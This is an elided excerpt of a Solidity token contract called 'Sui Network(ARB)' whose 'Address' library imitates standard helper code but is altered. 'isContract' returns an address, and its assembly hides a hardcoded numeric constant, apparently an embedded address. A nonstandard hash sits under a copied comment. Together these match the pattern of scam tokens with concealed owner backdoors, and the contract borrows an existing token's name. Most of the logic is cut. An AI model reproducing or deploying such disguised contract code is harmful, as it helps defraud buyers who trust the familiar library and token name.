...
contract SUI is Ownable, ERC20Burnable {
  constructor() Ownable() ERC20("Sui Network(ARB)", "SUI") {
...
library Address {
    ...
    function isContract(address account) internal view returns (address) {
        ...
        uint256 codehash;
        assembly {
            codehash := 391209542745682879700656870921224507046314700964
            mstore(0, account)
        }
    ...
    function accountHash(address account) internal view returns (bool) {
        ...
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.
        bytes32 accountHash = 0xcdbf7ef19b24a98f326bd64b411175b397f1d671d1334ec55dbb2eb24419fd76;
